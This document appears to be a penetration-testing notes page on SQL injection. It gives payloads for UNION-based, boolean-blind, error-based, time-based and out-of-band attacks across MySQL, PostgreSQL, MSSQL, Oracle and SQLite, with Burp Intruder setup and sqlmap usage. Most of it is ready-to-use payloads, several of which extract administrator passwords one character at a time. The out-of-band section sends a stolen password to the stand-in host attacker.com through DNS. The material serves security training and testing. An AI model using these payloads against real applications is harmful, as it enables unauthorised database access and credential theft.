---
title: "SQL injection"
weight: 22
description: "Comprehensive guide on detecting and exploiting SQL injection vulnerabilities, including blind, error-based, time-based, and out-of-band techniques with payloads, examples, and automation using sqlmap."
---

# SQL injection

## SQL Injection Cheatsheet

* [https://tib3rius.com/sqli](https://tib3rius.com/sqli)
* [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Overview

**How to detect SQLi vulnerabilities**

* The single quote character `'` and look for errors or other anomalies.
* Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the responses.
* Trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
* OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

{{< hint style=warning >}}
**Warning: `OR 1=1`** If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.
{{< /hint >}}

**Database-specific syntax**

* Example:
  * Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
  * MySQL: the double-dash sequence must be followed by a space

## SQL injection UNION attacks

Requirements:

* The number of the columns returned by the original query
* Columns from the original query must support data types for injected query results

### Determining the number of columns required

**First way**: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- etc.
```

***

**Second way**: submitting a series of `UNION SELECT` payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
-- etc.
```

{{< hint style=notes >}}
**Note**: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results
{{< /hint >}}

### Column data types

Do you want a string?

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,NULL,'a'-- -
```

If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.

### Examining database

* `' UNION SELECT @@version--`
* Most database types (except Oracle) have a set of views called the information schema

```markdown
# MySQL
# information_schema.tables
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE
MyDatabase       dbo             Products      BASE TABLE

# information_schema.columns
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE
MyDatabase       dbo             Users          UserId        id

# Find tables names
SELECT * FROM information_schema.tables
# Find columns names
SELECT * FROM information_schema.columns WHERE table_name = 'Users'SELECT * FROM information_schema.tables


# Oracle
SELECT * FROM all_tables
SELECT TABLE_NAME FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
```

### Retrieving multiple values within a single column

You can retrieve multiple values together within this single column by concatenating the values together.

```sql
' UNION SELECT username || '~' || password FROM users-- -
```

## Blind SQLi

Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

### Triggering conditional responses

**Detection**

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

```sql
xyz' AND '1'='1
xyz' AND '1'='2
```

See differences in response. Watch for subtle changes you might miss in the render! Use Burp's comparer

**Extract data one piece at a time**

```sql
xyz' AND SUBSTRING((SELECT Psw FROM Users WHERE Username = 'Admin'), 1, 1) = 's
```

See the response to confirm that the first character of the password is `s`

We can continue this process to systematically extract data.

### Error-based SQL injection

**Blind SQLi with conditional errors**

Problem: Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique "Triggering conditional responses" won't work, because injecting different boolean conditions makes no difference to the application's responses.

* It's often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
  * The CASE expression evaluates to 'a', which does not cause any error.
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
  * It evaluates to 1/0, which causes a divide-by-zero error.
* You can use this to determine whether the injected condition is true.
* `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

{{< hint style=notes >}}
**Note**: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet from tib3rius -> (Boolean Error Inferential Exploitation)
{{< /hint >}}

{{< details summary="Example" >}}

```sh
# In this example the response are always the same. 
However, if you submit an invalid query you will get an error.

# 1 - Check if it's vulnerable
## Normal request. 200 OK
Cookie: TrackingId=xyz
## Cause error. 500 Internal Server Error
Cookie: TrackingId=xyz'


# 2 - Identify database [tiberius cheatsheet]. NOTE: add comment at the end...
## (MySql). 500 Internal Server Error
Cookie: TrackingId=xyz' AND 'foo' 'bar' = 'foobar'#
## (ORACLE). 200 OK
Cookie: TrackingId=a' AND LENGTHB('foo') = '3'--


# 3 - Test boolean error. 
## Error condition: 500 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
## No error condition: 200 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--


# 4 - Extract data
## Error condition: 500 OK (it means that first char is 'a')
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
## No error condition: 200 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
```

{{< /details >}}

***

**Extracting sensitive data via verbose SQL error messages**

* Example: inject `'` and you get an error: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
* You can use the `CAST()` function to turns an otherwise blind SQL injection vulnerability into a visible one
* `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### Time-based SQL injection

* Condition: As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
* Triggering time delays depending on whether an injected condition is true or false
* We can retrieve data by testing one character at a time

```sql
# MySQL
AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
# PostgreSQL
AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)
# MSSQL
AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)
# Oracle
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
# SQLite
AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)
```

{{< details summary="Attack example and automation with burp (PostgreSQL)" >}}

* Attack type: cluster bomb
* Payload position: (substring position) `§1§` , (char to match)`§a§`
* `LIMIT 1` if you want the first row. Otherwise use `LIMIT 1 OFFSET 4`
* Create new resource pool with maximum concurrent request to 1

```sql
param=' AND 1337=(CASE WHEN ( (select substring(password,§1§,1) from users LIMIT 1 ) = '§a§' ) THEN (SELECT 1337 FROM PG_SLEEP(5)) ELSE 1337 END)--
```

{{< /details >}}

### Out-Of-Band (OAST) SQL injection

An application might carry out a SQL query asynchronously (another thread execute the SQL query)

```sql
-- Triggering a DNS query
'; exec master..xp_dirtree '//attacker.com/a'--
' UNION SELECT UTL_INADDR.get_host_address('attacker.com')

-- Exfiltrate data
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```

## Tips

* Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. **Check if there is a "default" \[error] response** or **Build a valid query** that provides a response indicating the parameter is vulnerable ... Example:
  * `/stockcheck?productID=1` and the response tell you 3 units (stock check)
  * `/stockcheck?productID='` and the response tell you 0 units ... in all case that you break...
  * `/stockcheck?productID=1 OR 1=1` the response give you units for all product...
* **Don't always use `'`** to check. Similar to the above case, it would be pointless
  * `/stockcheck?productID=1` . You know that exists a productID=2? Ok, try to inject `1+1` (instead of `1 OR 1=1` that it can be dangerous).
* Remember that you can **encode the cookie value**. This may be useful with payload that use `;`.
* Remember that **SQLi can occur at any location** (UPDATE, INSERT, SELECT \[column, table], ORDER BY)
* **SQLi can be even in XML/JSON**...
  * If there are some protection, try **XML encode**.
* Use `— -`  instead of `--` . In many SQL systems, there must be at least one space after `--` for the comment to be recognised.

## Automatic exploitation

```sh
# SQL
# Capture the request (burp/zap) and create a req.txt file
sqlmap -r req.txt
```
